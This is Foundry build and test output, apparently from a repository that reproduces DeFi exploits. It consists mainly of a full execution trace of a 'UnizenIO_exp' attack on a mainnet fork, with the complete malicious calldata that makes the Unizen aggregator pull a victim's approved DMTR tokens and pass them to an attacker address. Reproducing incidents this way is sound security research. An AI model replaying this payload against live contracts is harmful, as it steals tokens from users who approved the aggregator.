Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.15s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-03/UnizenIO_exp.sol:33:9:
   |
33 |         aggregator_proxy.call{value: 1}(
   |         ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 722.72ms (1.98ms CPU time)

Ran 1 test for src/test/2024-03/UnizenIO_exp.sol:UniZenIOTest
[PASS] testExploit() (gas: 95755)
Logs:
  Before attack, victim DMTR amount (in ether): 62802
  Before attack, victim approved DMTR amount (in ether) on UnizenAggregator: 40
  After attack, victim DMTR amount (in ether): 62761
  After attack, victim approved DMTR amount (in ether) on UnizenAggregator: 0

Traces:
  [26052] UniZenIOTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19393769 [1.939e7])
    │   └─ ← [Return] 0
    ├─ [2887] 0x51cB253744189f11241becb29BeDd3F1b5384fdB::balanceOf(0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a) [staticcall]
    │   └─ ← [Return] 62802284581179879618031 [6.28e22]
    ├─ emit log_named_uint(key: "Before attack, victim DMTR amount (in ether)", val: 62802 [6.28e4])
    ├─ [3263] 0x51cB253744189f11241becb29BeDd3F1b5384fdB::allowance(0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a, 0xd3f64BAa732061F8B3626ee44bab354f854877AC) [staticcall]
    │   └─ ← [Return] 40435797665369649920 [4.043e19]
    ├─ emit log_named_uint(key: "Before attack, victim approved DMTR amount (in ether) on UnizenAggregator", val: 40)
    └─ ← [Stop]

  [101355] UniZenIOTest::testExploit()
    ├─ [0] VM::startPrank(0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df)
    │   └─ ← [Return]
    ├─ [69960] 0xd3f64BAa732061F8B3626ee44bab354f854877AC::1ef29a02{value: 1}(000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002ad8aed847e8d4d3da52aabb7d0f5c25729d10df000000000000000000000000000000000000000000000000000000000000000000000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdb000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000297963e6c9965e0000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000110000000000000000000000000000000000000000000000000000000000000753000000000000000000000000000000000000000000000000000000000000000a554e495a454e2d434c49000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000007feaee6094b8b630de3f7202d04c33f3bdc3828a000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac0000000000000000000000000000000000000000000000023128cfbd15ed72f600000000000000000000000000000000000000000000000000000000)
    │   ├─ [62502] 0xA051Fc7D38bAa0ace811ad9DE4E9f7024e5d8A30::1ef29a02{value: 1}(000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002ad8aed847e8d4d3da52aabb7d0f5c25729d10df000000000000000000000000000000000000000000000000000000000000000000000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdb000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000297963e6c9965e0000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000110000000000000000000000000000000000000000000000000000000000000753000000000000000000000000000000000000000000000000000000000000000a554e495a454e2d434c49000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000007feaee6094b8b630de3f7202d04c33f3bdc3828a000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac0000000000000000000000000000000000000000000000023128cfbd15ed72f600000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [2887] 0x51cB253744189f11241becb29BeDd3F1b5384fdB::balanceOf(0xd3f64BAa732061F8B3626ee44bab354f854877AC) [staticcall]
    │   │   │   └─ ← [Return] 10815884862470152464 [1.081e19]
    │   │   ├─ [24388] 0x51cB253744189f11241becb29BeDd3F1b5384fdB::transferFrom(0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a, 0xd3f64BAa732061F8B3626ee44bab354f854877AC, 40435797665369649910 [4.043e19])
    │   │   │   ├─ emit Transfer(from: 0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a, to: 0xd3f64BAa732061F8B3626ee44bab354f854877AC, value: 40435797665369649910 [4.043e19])
    │   │   │   ├─ emit Approval(owner: 0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a, spender: 0xd3f64BAa732061F8B3626ee44bab354f854877AC, value: 10)
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xd7b2d84ea3d21252674d979eed1075327b60a9b9c9ec213a817a2310efd0693e: 0x0000000000000000000000000000000000000000000000023128cfbd15ed7300 → 10
    │   │   │   │   @ 0xbcaf4777f0cf9834c12346049a804aad4fa516df52d361c7550e0e6de5413e51: 0x0000000000000000000000000000000000000000000000009619bdfa370ee110 → 0x000000000000000000000000000000000000000000000002c7428db74cfc5406
    │   │   │   │   @ 0x2b4df9b86e8208a2c71466594a74de56d7bc37be155039aa94a1e3c6b614be5c: 0x000000000000000000000000000000000000000000000d4c84c77dd19a8475ef → 0x000000000000000000000000000000000000000000000d4a539eae14849702f9
    │   │   │   └─ ← [Return] true
    │   │   ├─ [887] 0x51cB253744189f11241becb29BeDd3F1b5384fdB::balanceOf(0xd3f64BAa732061F8B3626ee44bab354f854877AC) [staticcall]
    │   │   │   └─ ← [Return] 51251682527839802374 [5.125e19]
    │   │   ├─ [11847] 0x51cB253744189f11241becb29BeDd3F1b5384fdB::transfer(0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df, 40435797665369649910 [4.043e19])
    │   │   │   ├─ emit Transfer(from: 0xd3f64BAa732061F8B3626ee44bab354f854877AC, to: 0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df, value: 40435797665369649910 [4.043e19])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xbcaf4777f0cf9834c12346049a804aad4fa516df52d361c7550e0e6de5413e51: 0x000000000000000000000000000000000000000000000002c7428db74cfc5406 → 0x0000000000000000000000000000000000000000000000009619bdfa370ee110
    │   │   │   │   @ 0x7d907f6c27a0c01b213f0c111f63e6064f376db5c03742ce9408edd457321dea: 0x0000000000000000000000000000000000000000000004087bc786ea3fc1fe81 → 0x00000000000000000000000000000000000000000000040aacf056a755af7177
    │   │   │   └─ ← [Return] true
    │   │   ├─  emit topic 0: 0xe3aecd3d46b48cc4869cac1e9bad367d8ebe45dd01d231fe7d442d3f85ca7565
    │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000023128cfbd15ed72f6000000000000000000000000000000000000000000000000000000000000000000000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdb0000000000000000000000002ad8aed847e8d4d3da52aabb7d0f5c25729d10df0000000000000000000000002ad8aed847e8d4d3da52aabb7d0f5c25729d10df0000000000000000000000000000000000000000000000000000000000000011
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [887] 0x51cB253744189f11241becb29BeDd3F1b5384fdB::balanceOf(0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a) [staticcall]
    │   └─ ← [Return] 62761848783514509968121 [6.276e22]
    ├─ emit log_named_uint(key: "After attack, victim DMTR amount (in ether)", val: 62761 [6.276e4])
    ├─ [1263] 0x51cB253744189f11241becb29BeDd3F1b5384fdB::allowance(0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a, 0xd3f64BAa732061F8B3626ee44bab354f854877AC) [staticcall]
    │   └─ ← [Return] 10
    ├─ emit log_named_uint(key: "After attack, victim approved DMTR amount (in ether) on UnizenAggregator", val: 0)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.79s (3.26s CPU time)

Ran 2 test suites in 7.91s (7.51s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
